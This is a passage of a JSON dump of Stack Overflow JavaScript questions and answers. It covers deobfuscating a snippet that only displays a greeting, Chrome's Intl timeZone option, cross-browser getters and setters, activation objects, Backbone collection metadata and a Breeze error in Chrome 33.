            "body": "<p>I came across a cryptic jQuery and am interested to understand how it works.</p>\n\n<p><a href=\"http://jsfiddle.net/fsW6U/\">http://jsfiddle.net/fsW6U/</a></p>\n\n<p>Also check the code below:</p>\n\n<pre><code>$ = ~ [];\n$ = {\n    ___: ++$,\n    $$$$: (![] + \"\")[$],\n    __$: ++$,\n    $_$_: (![] + \"\")[$],\n    _$_: ++$,\n    $_$$: ({} + \"\")[$],\n    $$_$: ($[$] + \"\")[$],\n    _$$: ++$,\n    $$$_: (!\"\" + \"\")[$],\n    $__: ++$,\n    $_$: ++$,\n    $$__: ({} + \"\")[$],\n    $$_: ++$,\n    $$$: ++$,\n    $___: ++$,\n    $__$: ++$\n};\n$.$_ = ($.$_ = $ + \"\")[$.$_$] + ($._$ = $.$_[$.__$]) + ($.$$ = ($.$ + \"\")[$.__$]) + ((!$) + \"\")[$._$$] + ($.__ = $.$_[$.$$_]) + ($.$ = (!\"\" + \"\")[$.__$]) + ($._ = (!\"\" + \"\")[$._$_]) + $.$_[$.$_$] + $.__ + $._$ + $.$;\n$.$$ = $.$ + (!\"\" + \"\")[$._$$] + $.__ + $._ + $.$ + $.$$;\n$.$ = ($.___)[$.$_][$.$_];\n$.$($.$($.$$ + \"\\\"\" + $.$_$_ + (![] + \"\")[$._$_] + $.$$$_ + \"\\\\\" + $.__$ + $.$$_ + $._$_ + $.__ + \"(\\\\\\\"\\\\\" + $.__$ + $.__$ + $.___ + \"\\\\\" + $.__$ + $.$_$ + $.__$ + \"!\\\\\\\");\" + \"\\\"\")())();\n</code></pre>\n\n<p>Can someone break this code down line-by-line and explain how each line works?</p>\n",
            "last_activity_date": 1393105652,
            "question_id": 21955230,
            "score": 14,
            "tags": [
                "javascript",
                "deobfuscation"
            ],
            "title": "How does this obfuscated javascript code work?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<h3>update</h3>\n\n<p>There is pretty extensive write-up about the API <a href=\"http://generatedcontent.org/post/59403168016/esintlapi\">here</a></p>\n\n<hr>\n\n<blockquote>\n  <p>Is this part of a new standard? Perhaps buried somewhere in ECMAScript\n  6? Or is it just something custom to Chrome?</p>\n</blockquote>\n\n<p>Yes, these are part of the <a href=\"http://www.ecma-international.org/ecma-402/1.0/\">ECMAScript Internationalization API</a>. It is implemented separate from ECMAScript, but the requirement of implementing ECMAScript Internationalization API is to first have correct implementation of ECMAScript 5.1</p>\n\n<blockquote>\n  <p>Why just Google Chrome? Is it supported anywhere else? Are there plans\n  to supported it anywhere else?</p>\n</blockquote>\n\n<p>For the recent years, Google Chrome has mostly been first to implement new features. Mozilla is more conservative, still for example discussing whether to implement the <code>download</code> attribute of <code>a</code> elements. It is now available in <a href=\"http://msdn.microsoft.com/en-us/library/dn305667%28v=vs.85%29.aspx\">IE11 Beta</a> and <a href=\"http://stackoverflow.com/questions/17478086/chrome-timezone-option-to-date-tolocalestring#comment26240547_17478810\">Opera</a> too. It will be available in <a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=853301#c34\">Firefox 25</a>. </p>\n\n<blockquote>\n  <p>I checked node.js, which uses Chrome's JavaScript runtime, but it\n  doesn't work there. Why not?</p>\n</blockquote>\n\n<p>node.js just uses the same engine, which is <a href=\"http://v8.googlecode.com\">a separate project</a> from the Google Chrome browser. The engine just implements Ecmascript 5.1. This is an extension node.js would have to implement separately right now. It will become available in <a href=\"https://code.google.com/p/v8-i18n/\">V8 in Q3</a> so probably a bit after that you can use it in node.js.</p>\n\n<blockquote>\n  <p>This is focused on output, but how would I use it for input? Is there\n  a way to pass the time zone in the constructor to the Date object? I\n  tried the following:</p>\n</blockquote>\n\n<p>There is nothing about inputting dates in the specification. I personally cannot see how this would be useful, you are doing it wrong if you are not transmitting UTC timestamps because something like <code>\"2013-01-01 12:34:56 America/New_York\"</code> is ambiguous during transitions from DST to standard time.</p>\n\n<blockquote>\n  <p>The issue described in this post, created by a flaw in the ECMAScript\n  5 spec, still affects the output, even when the correct data is in the\n  TZDB.</p>\n</blockquote>\n\n<p>This is input issue, not output. Again, constructing a date with local timezone that you cannot influence or detect is doing it wrong. Use the timestamp constructor overload or <code>Date.UTC</code>.</p>\n\n<blockquote>\n  <p>Can I expect that as IANA releases updates to the TZDB that Google\n  will push Chrome updates that contain the changes?</p>\n</blockquote>\n\n<p>Nothing in the spec but I think it will be reasonable to expect that the rules are not too much behind.</p>\n",
                    "is_accepted": true,
                    "score": 11
                },
                {
                    "body": "<blockquote>\n  <p>Is this part of a new standard? Perhaps buried somewhere in ECMAScript\n  6? Or is it just something custom to Chrome?</p>\n</blockquote>\n\n<p>Indeed it is part of the new ECMA-402 standard. The standard is very difficult to read, but there is <a href=\"http://norbertlindenberg.com/2012/12/ecmascript-internationalization-api/\">this friendly introduction</a>.</p>\n\n<blockquote>\n  <p>Why just Google Chrome? Is it supported anywhere else? Are there plans\n  to supported it anywhere else?</p>\n</blockquote>\n\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl\">MDN has a list of supporting browsers</a>. According to <a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=853301\">Bug 853301</a> it will be available in Firefox 25.</p>\n\n<blockquote>\n  <p>I checked node.js, which uses Chrome's JavaScript runtime, but it doesn't work there. Why not?</p>\n</blockquote>\n\n<p>Possible reasons are many; it is not up to the current code base, or it would make the node.js  bigger and slower (the previous bug tracker entry from Mozilla indicates that the timezone data increased the download size of Firefox by 10 %, and caused the I/O to increase substantially during browser start up.</p>\n\n<blockquote>\n  <p>Is the time zone data accessible in any other way than the functions I listed? If only<br>\n  available when formatting strings, then doing any calculations based on the results may be \n  difficult.</p>\n</blockquote>\n\n<p>Seems that it is not available. Furthermore, the Intl API primer talks that only UTC and local time zone are absolutely required to be supported.</p>\n\n<blockquote>\n  <p>This is focused on output, but how would I use it for input? Is there a way to pass \n  the time zone in the constructor to the Date object? I tried the following:</p>\n</blockquote>\n\n<p>The Intl API only speaks about date/time formatting, string collations and number formatting. The datetime formatting not only supports the Gregorian calendar but also many kinds of other calendars, lunar, lunisolar and so forth.</p>\n\n<blockquote>\n  <p>The issue described in this post, created by a flaw in the ECMAScript 5 spec, still affects \n  the output, even when the correct data is in the TZDB. How is it that both old and new \n  implementations are coexisting? One would think it would be all the old way, or all the new \n  way. For example, with my computer's time zone set to US Eastern Time:</p>\n  \n  <p>new Date(2004,10,7,0,0).toLocaleString(\"en-US\",{timeZone:\"America/New_York\"})</p>\n  \n  <p>returns \"11/6/2004 11:00:00 PM\". It should return midnight, since I started at midnight and > my local time zone matches the output time zone. But it places the provided input date at the > wrong UTC point due to the ES5 issue.</p>\n</blockquote>\n\n<p>The reason for that is that ES5 mandates that the input to new Date be calculated using the current DST and offset, that is it is America/New York but with EDT timezone, even though Nov 6 is not in EDT. Obviously as this is so specified, then it cannot be changed. However, as Chrome is using the TZDB to do the conversion from the bare UTC point-in-time value to the America/New York tz, it then does consider the time as being in EST.</p>\n\n<blockquote>\n  <p>Can I expect that as IANA releases updates to the TZDB that Google will push Chrome updates \n  that contain the changes?</p>\n</blockquote>\n\n<p>I'd believe so</p>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<p>I have recently discovered that there is a new extension to JavaScript.  This adds several features to the <code>Date</code> object in the <code>toLocaleString</code>, <code>toLocaleDateString</code> and <code>toLocaleTimeString</code> functions.  <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toLocaleString\">Reference here</a>.</p>\n\n<p>I am particularly interested in the <code>timeZone</code> option, that supports <a href=\"http://www.iana.org/time-zones\">IANA/Olson time zones</a>, such as <code>America/New_York</code> or <code>Europe/London</code>.  <strong>This is currently only supported in Google Chrome</strong>.</p>\n\n<p>Previous advice was that to work in JavaScript with any other time zone than UTC or your own local time zone, one had to <a href=\"http://stackoverflow.com/a/15171030/634824\">use a library</a>.  But now, it appears that this is starting to be incorporated directly into the browser.  So now you can do this:</p>\n\n<pre><code>new Date().toLocaleString(\"en-US\", {timeZone: \"America/New_York\"})\n\n// output: \"7/4/2013 5:15:45 PM\"\n</code></pre>\n\n<p>Or:</p>\n\n<pre><code>new Date().toLocaleString(\"en-NZ\", {timeZone: \"Pacific/Chatham\",\n                                    timeZoneName: \"long\"})\n\n// output:  \"7/5/2013 9:59:52 AM GMT+12:45\"\n</code></pre>\n\n<p>Or:</p>\n\n<pre><code>new Date().toLocaleString(\"en-GB\", {timeZone: \"Europe/London\",\n                                    timeZoneName: \"short\"})\n\n// output:  \"4/7/2013 22:18:57 United Kingdom Time\"\n// (strange time zone name, but ok)\n</code></pre>\n\n<p>This is <em>very</em> cool, but I have a few questions:</p>\n\n<ul>\n<li>Is this part of a new standard?  Perhaps buried somewhere in ECMAScript 6?  Or is it just something custom to Chrome?</li>\n<li>Why just Google Chrome?  Is it supported anywhere else?  Are there plans to supported it anywhere else?</li>\n<li>I checked node.js, which uses Chrome's JavaScript runtime, but it doesn't work there.  Why not?</li>\n<li>Is the time zone data accessible in any other way than the functions I listed?  If only available when formatting strings, then doing any calculations based on the results may be difficult.</li>\n<li><p>This is focused on output, but how would I use it for input?  Is there a way to pass the time zone in the constructor to the <code>Date</code> object?  I tried the following:</p>\n\n<pre><code>// parsing it with a date and time\nnew Date(\"2013-01-01 12:34:56 America/New_York\")\n\n// passing it as a named option\nnew Date(2013,0,1,12,34,56,{timeZone:\"America/New_York\"})\n</code></pre>\n\n<p>Neither worked.  I couldn't find anything in the specs, so I don't think this exists (yet), but please tell me if I am wrong.</p></li>\n<li><p>The issue described in <a href=\"http://stackoverflow.com/q/16946002/634824\">this post</a>, created by a flaw in the ECMAScript 5 spec, still affects the output, even when the correct data is in the TZDB.  How is it that both old and new implementations are coexisting?  One would think it would be all the old way, or all the new way.  For example, with my computer's time zone set to US Eastern Time:</p>\n\n<pre><code>new Date(2004,10,7,0,0).toLocaleString(\"en-US\",{timeZone:\"America/New_York\"})\n</code></pre>\n\n<p>returns <code>\"11/6/2004 11:00:00 PM\"</code>.  It should return midnight, since I started at midnight and my local time zone matches the output time zone.  But it places the provided input date at the wrong UTC point due to the ES5 issue.</p></li>\n<li><p>Can I expect that as IANA releases updates to the TZDB that Google will push Chrome updates that contain the changes?</p></li>\n</ul>\n",
            "last_activity_date": 1377609539,
            "question_id": 17478086,
            "score": 14,
            "tags": [
                "javascript",
                "google-chrome",
                "date",
                "internationalization",
                "timezone"
            ],
            "title": "Chrome timeZone option to Date.toLocaleString()"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I don't believe you can. </p>\n\n<p>In <code>IE8</code> and lower, property access is mere property access. There's no way to run function code without explicitly invoking the function.</p>\n\n<p>I think in IE8 you may be able to with DOM elements, but I don't believe it works for regular native objects.</p>\n",
                    "is_accepted": true,
                    "score": 4
                },
                {
                    "body": "<p>You cannot, the syntax is not supported in browsers  that did not implement it. Its going to be quite a while before you'll be able to use that syntax without having CBC problems. Be grateful IE6 is pretty much dead in North America.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>There is a \"definePropery\" method that will essentially allow you to create accessor methods (getters/setters) on Objects without the need to invoke a function call like setProp() / getProp().</p>\n\n<p>The syntax is a little weird but I've been able to get this to work on Firefox, Chrome, Safari and IE9.</p>\n\n<p>Say I have JavaScript Object called \"Person\".</p>\n\n<pre><code>function Person()\n{\n // set a default value //\n    this.__name = 'John';\n // add getter &amp; setter methods //\n    Object.defineProperty(this, \"name\", {\n        get: function() {\n        // additional getter logic\n            return this.__name;\n        },\n        set: function(val) {\n            this.__name = val;\n        // additional setter logic\n        }\n    });\n}\n\nvar p = new Person();\nconsole.log(p.name); // 'John'\np.name = 'Stephen';\nconsole.log(p.name); // 'Stephen'\n</code></pre>\n\n<p>More info on Mozilla's site <a href=\"https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/defineProperty\" rel=\"nofollow\">here.</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Here is the <a href=\"http://johndyer.name/native-browser-get-set-properties-in-javascript/\">workaround</a> for IE6/7/8. I performed the test and it works very well!</p>\n\n<p>Update: The link is broken, you can see the code of from my testing here:</p>\n\n<pre><code>    // Super amazing, cross browser property function, based on http://thewikies.com/\nfunction addProperty(obj, name, onGet, onSet) {\n\n    // wrapper functions\n    var\n        oldValue = obj[name],\n        getFn = function () {\n            return onGet.apply(obj, [oldValue]);\n        },\n        setFn = function (newValue) {\n            return oldValue = onSet.apply(obj, [newValue]);\n        };\n\n    // Modern browsers, IE9+, and IE8 (must be a DOM object),\n    if (Object.defineProperty) {\n\n        Object.defineProperty(obj, name, {\n            get: getFn,\n            set: setFn\n        });\n\n    // Older Mozilla\n    } else if (obj.__defineGetter__) {\n\n        obj.__defineGetter__(name, getFn);\n        obj.__defineSetter__(name, setFn);\n\n    // IE6-7\n    // must be a real DOM object (to have attachEvent) and must be attached to document (for onpropertychange to fire)\n    } else {\n\n        var onPropertyChange = function (e) {\n\n            if (event.propertyName == name) {\n                // temporarily remove the event so it doesn't fire again and create a loop\n                obj.detachEvent(\"onpropertychange\", onPropertyChange);\n\n                // get the changed value, run it through the set function\n                var newValue = setFn(obj[name]);\n\n                // restore the get function\n                obj[name] = getFn;\n                obj[name].toString = getFn;\n\n                // restore the event\n                obj.attachEvent(\"onpropertychange\", onPropertyChange);\n            }\n        };  \n\n        obj[name] = getFn;\n        obj[name].toString = getFn;\n\n        obj.attachEvent(\"onpropertychange\", onPropertyChange);\n\n    }\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 10
                }
            ],
            "body": "<p>This works in modern Chrome/Firefox/Opera but fails in IE8. Haven't tried it in IE9. How can I make this cross-browser compatible, including IE7+? <a href=\"http://jsfiddle.net/5j4Us/9/\">(Fiddle here.)</a></p>\n\n<pre><code>var foo = { \n    get test(){ return 'Works'; } \n};\n\n// foo.test should be 'Works'\n</code></pre>\n\n<p>I've seen some usage with <code>__defineGetter__</code> but that threw an 'unrecognized method' error in IE8.</p>\n",
            "last_activity_date": 1346125779,
            "question_id": 9106936,
            "score": 14,
            "tags": [
                "javascript",
                "internet-explorer",
                "cross-browser",
                "getter",
                "getter-setter"
            ],
            "title": "Cross-browser Getter and Setter"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Well, I just learned something :). From <a href=\"http://jibbering.com/faq/notes/closures/\">this article</a>, it would appear that <em>within the execution context of a function</em>, the Activation Object is used as the Variable Object:</p>\n\n<blockquote>\n  <p>When an execution context is created a number of things happen in a defined order. First, in the execution context of a function, an \"Activation\" object is created. [...]</p>\n  \n  <p>Then the process of \"variable instantiation\" takes place using an object that ECMA 262 refers to as the \"Variable\" object. However, the Activation object is used as the Variable object (note this, it is important: they are the same object). Named properties of the Variable object are created for each of the function's formal parameters, and if arguments to the function call correspond with those parameters the values of those arguments are assigned to the properties (otherwise the assigned value is undefined).</p>\n</blockquote>\n\n<p>However, when you're in the global scope, there isn't an Activation Object, so the Global Object is used as the Variable Object instead:</p>\n\n<blockquote>\n  <p>The global execution context gets some slightly different handling as it does not have arguments so it does not need a defined Activation object to refer to them. [...] The global object is used as the Variable object, which is why globally declared functions become properties of the global object.</p>\n</blockquote>\n\n<p>So it sounds like \"Activation Object\" and \"Variable Object\" are the same thing within a function context, but not within the global context.</p>\n",
                    "is_accepted": true,
                    "score": 15
                },
                {
                    "body": "<p>An <strong>activation object</strong> is the uppermost object in a <em>scope-chain</em> with the lowermost being <strong>global object</strong>.\nWhereas <strong>variable object</strong> is abstract concept and therefore, depending on its execution context, is any link in <em>scope-chain</em> including <strong>activation/global object</strong>.</p>\n\n<hr>\n\n<p>It contains:</p>\n\n<ul>\n<li>all the <em>variables and functions</em> you declare inside the function body;</li>\n<li><em>arguments named</em> as specified by the function signature;</li>\n<li>arguments as an <em>object named <code>arguments</code></em> (in case you want your function to support multiple signatures).</li>\n</ul>\n\n<p>It doesn't contain:</p>\n\n<ul>\n<li><code>this</code> (as it's not a variable);</li>\n<li>named <em>function expressions</em>.</li>\n</ul>\n\n<hr>\n\n<p>Further info - <a href=\"http://dmitrysoshnikov.com/ecmascript/javascript-the-core/#variable-object\" rel=\"nofollow\">JavaScript. The core.</a></p>\n\n<p>Few quotes in case of <strong>tl;dr</strong>:</p>\n\n<blockquote>\n  <p>A <strong>variable object</strong> is a <em>scope of data</em> related with the execution context. It\u2019s a <em>special object</em> associated with the context and which stores variables and function declarations are being defined within the context.</p>\n  \n  <p>A <strong>variable object</strong> is an <em>abstract concept</em>. In different context types, physically, it\u2019s presented using different object.</p>\n  \n  <p>[..] in the global context the <strong>variable object</strong> is the <strong>global object</strong> itself [..]</p>\n  \n  <p>[..] a function\u2019s <strong>variable object</strong> is the same simple <strong>variable object</strong>, but besides <em>variables</em> and <em>function declarations</em>, it also stores <em>formal parameters</em> and <code>arguments</code> object, and is called the <strong>activation object</strong>.</p>\n  \n  <p>[..] when accessing <code>this</code> in a code, its value is taken directly from the <em>execution context</em> without any <em>scope-chain</em> lookup.</p>\n</blockquote>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>Is the term \"activation object\" just another name of \"variable object\" or is there actually any difference between them?  I have been reading a few JavaScript articles about how variable scopes are formed in an execution context, and from my point of view it seems that in most of the articles they use these two terms interchangeably.</p>\n",
            "last_activity_date": 1390539571,
            "question_id": 6337344,
            "score": 14,
            "tags": [
                "javascript",
                "ecma262"
            ],
            "title": "Activation and Variable Object in JavaScript?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>One way to do this is to override the <code>Collection::fetch()</code> method so that it parses this metadata out of the response. You could have your backend return a response like this:</p>\n\n<pre><code>{\n    \"collection\": [\n        { ... model 1 ... },\n        { ... model 2 ... },\n        ...\n    ],\n    \"total_rows\": 98765,\n    \"pages\":      43\n}\n</code></pre>\n\n<p>In your <code>fetch</code> method which overrides the original <code>Backbone.Collection::fetch()</code> method, you can handle each property of the object separately. Here's you could do the override with a slightly modified <code>fetch</code> method:</p>\n\n<pre><code>_.extend(Backbone.Collection.prototype, {\n  fetch : function(options) {\n    options || (options = {});\n    var collection = this;\n    var success = options.success;\n    options.success = function(resp) {\n      // Capture metadata\n      if (resp.total_rows) collection.total_rows = resp.total_rows;\n      if (resp.pages)      collection.pages      = resp.pages;\n\n      // Capture actual model data\n      collection[options.add ? 'add' : 'refresh'](\n        collection.parse(resp.collection), options);\n\n      // Call success callback if necessary\n      if (success) success(collection, resp);\n    };\n    options.error = wrapError(options.error, collection, options);\n    (this.sync || Backbone.sync).call(this, 'read', this, options);\n    return this;\n});\n</code></pre>\n\n<p>Note that this approach using <code>_.extend</code> will affect <strong>all</strong> your classes which extend <code>Backbone.Collection</code>. </p>\n\n<p>This way, you don't have to make 2 separate calls to the backend.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I would bootstrap the information at pagecreation. Write the information into the html document when the server creates the site. Like that you don't have to have an ajax call at all. I do that with the whole collection in ordner not to first load the page and then wait for the ajax call to return the information needed.</p>\n\n<p>Code example with Python:</p>\n\n<p>Line 64: <a href=\"https://github.com/ichbinadrian/maps/blob/master/python/main.py\" rel=\"nofollow\">https://github.com/ichbinadrian/maps/blob/master/python/main.py</a> &lt;- from here</p>\n\n<p>Line 43: <a href=\"https://github.com/ichbinadrian/maps/blob/master/templates/index.html\" rel=\"nofollow\">https://github.com/ichbinadrian/maps/blob/master/templates/index.html</a> &lt;- into here</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Generally, you need to handle this in the collection class' parse method.  Its responsibility is to take the response and return back an array of model attributes.  However, you could do more than that if you wished if you didn't mind the parse method having this additional responsibility.</p>\n\n<pre><code>UserList = Backbone.Collection.extend({\n\n    model: User,\n\n    url: '/users',\n\n    parse: function(data) {\n        if (!data) {\n            this.registered_users = 0;\n            return []; \n        } \n        this.registered_users = data.registered_users;\n        var users = _(data.users).map(\n            function(user_data) {\n                var user = {};\n                user['name'] = user_data.name;          \n                return user;\n            }\n        );\n        return users;\n    }\n</code></pre>\n\n<p>});</p>\n\n<p>So in the trivial example above, presume the server returns a response which contains a count of registered users and and an array of user attributes.  You would both parse through and return the user attributes and you would pick off the registered user count and just set it as a variable on the model.  The parse method would get called as part of a fetch.  So no need to modify the fetch, just use the built-in hook method that you have.</p>\n\n<p>Purists would say that you are giving the parse method a secondary responsibility which might surprise some people (e.g. returning something and modifying model state).  However, I think this is okay.</p>\n",
                    "is_accepted": true,
                    "score": 28
                }
            ],
            "body": "<p>I have a collection which holds some of the users. Some information that is needed is how many total there are, how many pages, etc. How do I pass these back to the client? Or do they have to come from a separate view in which case I will need more than one ajax call? I'd like to have the collection <code>fetch()</code> and also receive some of this \"meta data\". What's a good way for handling this?</p>\n",
            "last_activity_date": 1304179669,
            "question_id": 5711245,
            "score": 14,
            "tags": [
                "javascript",
                "jquery",
                "ajax",
                "backbone.js",
                "underscore.js"
            ],
            "title": "backbone.js - getting extra data along with the request"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>Looking at the code, Breeze is expecting either 'curContext.prevContext' or 'context.prevContext' to be 'null'.  One of them has to be 'null' in this check.</p>\n\n<p>The error is thrown when <strong>both</strong> curContext.prevContext and context.prevContext already are set to a value.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This started occurring when Chrome updated to version 33. It did not happen in Chrome 32.\nI downgraded Breeze from version 1.4.8 to version 1.4.7, and this <strike>fixed the problem</strike> made the problem happen less often. </p>\n\n<p>(The only breaking change listed in the <a href=\"http://www.breezejs.com/documentation/download\" rel=\"nofollow\">changelog</a> is that <code>contains</code> queries must be escaped in version 1.4.7. So do a <code>word = word.replace(/'/g, \"''\");</code> before doing <code>.where(\"yourColumn\", \"contains\", word)</code>)</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>Nope, changing to 1.4.7 did NOT fix this, it just made the problem occur much less often.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>We're kind of stumped because no one can pin down when this happens.</p>\n\n<p>Would you all do us a favor and modify your breeze.debug.js to capture more information about the state of affairs when it throws?</p>\n\n<p>Maybe you can add this:</p>\n\n<pre><code>} else {\n     console.log(\"** Aaargh! 'curContext.prevContext': \" + curContext.prevContext +\n                \" 'context.prevContext': \" + context.prevContext);\n     throw new Error(\"Illegal construction - use 'or' to combine checks\");\n}\n</code></pre>\n\n<p>Grasping at straws. All info helps.</p>\n\n<h1>Update 26 Feb 2014</h1>\n\n<p>AHA!  Thank you @steve, @matthias, and others!</p>\n\n<p>As I privately suspected, something, somewhere, has decide to set prevContext to <code>undeclared</code> instead of <code>null</code>. I was going to recommend that we switch to \"==\" anyway ... which would handle both cases. Falsiness is good enough IMO.  We'll get back to you when we do it (assuming no one inside the Breeze team objects to applying a fix that we can't test).</p>\n\n<h1>Update 27 Feb 2014</h1>\n\n<p>I'm running my DocCode tests with <code>breeze.min.js</code> in Chrome v33 and they all pass. Frustrating. Jay will run his tests with <code>breeze.min.js</code> in Chrome v33 too ... and we will see if any of them fail for him. I am not hopeful.  </p>\n\n<p>I get the expected behavior for sensible (including illegal) variations of <code>parm</code> (<code>undefined</code>, <code>null</code>, <code>true</code>, <code>false</code>, a <code>string</code>) on the line from <code>getEntityType</code> that @Matthias mentioned</p>\n\n<pre><code>assertParam(parm, \"okIfNotFound\").isBoolean().isOptional().check(false);\n</code></pre>\n\n<p>My static analysis of the code (who trusts <em>that</em>?) tells me that the first comparison operator must remain <code>===</code> whereas the comparison operator in the second clause can be either <code>==</code> or <code>===</code>.  The code author worked hard to make sure that the left operand was never <code>undefined</code> in practice; my static analysis shows that it <em>could become</em> <code>undefined</code> ... although I am unable to arrange the world so that it happens. Maybe a failure of imagination.</p>\n\n<p>My static analysis of the minified code says it is correct although <strong><em>my</em></strong> minified version is different from yours, perhaps because mine is minified against an evolving copy of breeze.debug.js (somewhere closer to what v.1.4.9 will be).</p>\n\n<pre><code>// Reformatted w/ spaces and new lines for readability. \n// Observe that the minifier reversed the direction of the second null test!\n// That is smart and does no harm\n// I can assure you the pre-minified code is the same as what you folks are reporting.\nfunction m(a,b) {\n    if(a._context){\n          for(var c=a._context; null!=c.prevContext;) c=c.prevContext;\n          if(null === c.prevContext) return c.prevContext=b, a;\n          if(null !== b.prevContext)\n               throw new Error(\"Illegal construction - use 'or' to combine checks\");\n          b.prevContext=a._context\n    }\n    return n(a,b)\n}\n</code></pre>\n\n<p>Under these trying circumstances, unless we can find a failing test, we'll make a leap of faith, slaughter a chicken, rattle some bones, and change the code to this:</p>\n\n<pre><code>if (curContext.prevContext === null) {\n    curContext.prevContext = context;\n    // just update the prevContext but don't change the curContext.\n    return that;\n} else if (context.prevContext == null) {  // CHANGED TO \"if null or undefined\"\n    context.prevContext = that._context;\n} else {\n    throw new Error(\"Illegal construction - use 'or' to combine checks\");\n}\n</code></pre>\n\n<p>If you can make the time, please try this in your apps and confirm that all is well.</p>\n\n<p>We're shipping v.1.4.9 tomorrow (28 Feb) so <strong>please try this pronto!</strong></p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>My team has been having this problem too. It started happening about a month ago, but has really increased in frequency over the past 1-2 weeks. Possibly the recent chrome release to blame.</p>\n\n<p>Here is what I know, all commentary relative to breeze 1.4.1:</p>\n\n<p>-The behavior is intermittent, and seemingly occurs at random. To me, this indicates a timing issue.</p>\n\n<p>-The primary browser generating this error is chrome. We also support firefox and IE and have no concrete evidence that any browser but chrome is throwing this error. Perhaps the recent release of chrome has a different performance profile that exacerbates a pre-existing issue (again, timing?) </p>\n\n<p>-For us, turning off bundling and minification seems to eliminate the problem. I don't believe there is an issue with our minified code (Microsoft Web Optimizations) as everything works on other browsers regardless. This to me again indicates a timing issue.</p>\n\n<p>-Finally, I was just able to reproduce it in my dev environment with the chrome developer tools open. Using a q promise stack, and painfully navigating the minified code I was able to narrow it down to this: At my app start, I call fetchMetadata. Within the fetchMetadata success handler, I make a call to metadataStore.getEntityType('some_entity') and it is within this breeze method that the error is being generated in my scenario. Something with the metadata store isn't consistently initialized or setup at this early stage in the pages app lifecycle.</p>\n\n<p>EDIT: From the comments, this appears to be a chrome 33 bug where null !== null at random times. For unknown reasons, the minifying of the breeze.debug.js file seems to be related (most/all reports of the problem are happening on a minified version of breeze). For me, changing the following code in breeze.debug.js:</p>\n\n<pre><code>} else if (context.prevContext === null) {\n    context.prevContext = that._context;\n} else {\n    throw new Error(\"Illegal construction - use 'or' to combine checks\");\n}\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>} else if (context.prevContext == null) {\n    context.prevContext = that._context;\n} else {\n    throw new Error(\"Illegal construction - use 'or' to combine checks\");\n}\n</code></pre>\n\n<p>(change === to == on first line) seems to have resolved the issue as a workaround. All other aspects of breeze are working fine for me after this change.</p>\n\n<p>One other thing I have noticed is that the minified version of the function has an argument with the same name of the function (t). This still doesn't explain the results of the \"Aaarg\" test.</p>\n\n<pre><code>   function t(n, t) {\n        if (n._context) {\n            for (var i = n._context; i.prevContext != null; )\n                i = i.prevContext;\n            if (i.prevContext === null)\n                return i.prevContext = t, n;\n            if (t.prevContext == null)\n                t.prevContext = n._context;\n            else\n                throw new Error(\"Illegal construction - use 'or' to combine checks\");\n        }\n        return b(n, t)\n    }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>For our application, switching to the <strong>non-minified</strong> (debug) version of breeze 1.4.8 <strong>eliminated the error</strong>.  I cannot say with confidence that this will fix the problem for everyone since I don't know the root cause of the problem or how minification causes the error.  Maybe the error can still happen with the non-minified version, but it doesn't in our application.</p>\n\n<p>FWIW: Based on our experience and what I've read from others, the error is characterized in that it:</p>\n\n<ul>\n<li>only occurs in the latest version of Chrome (33) -- windows and mac!</li>\n<li>does not always happen.</li>\n<li>seems to have a timing aspect.  For us it only happens in first few breeze queries after starting the application -- although not necessarily the first query.</li>\n<li>occurs for every query after the first query that fails.</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Ok, we just released Breeze 1.4.9 with Mathias999us's suggested fix.  Please let us know whether this fixes the issue ... or not.  Thanks Mathias ;)</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I met this Breeze error </p>\n\n<blockquote>\n  <p>[Illegal construction - use 'or' to combine checks]  </p>\n</blockquote>\n\n<p>on Chrome when loading the edit page of an entity. When I refresh the page, the error message no longer appears. This error happens randomly, irregularly on my site. I could not reproduce it using a specified scenario, just met it by random.</p>\n\n<p>I see this error message inside Breeze code</p>\n\n<pre><code>if (curContext.prevContext === null) {\n    curContext.prevContext = context;\n    // just update the prevContext but don't change the curContext.\n    return that;\n} else if (context.prevContext === null) {\n    context.prevContext = that._context;\n} else {\n    throw new Error(\"Illegal construction - use 'or' to combine checks\");\n}\n</code></pre>\n\n<p>Could you please tell me: based on above block of code, in which cases this error is thrown?</p>\n\n<p>Thanks a lot.</p>\n",
            "last_activity_date": 1394632884,
            "question_id": 21970216,
            "score": 13,
            "tags": [
                "javascript",
                "breeze"
            ],
            "title": "Breeze error: Illegal construction - use &#39;or&#39; to combine checks"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<pre><code>a_href = a_href.replace(/(test_ref=)[^\\&amp;]+/, '$1' + updated_test_ref);\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 33
                },
                {
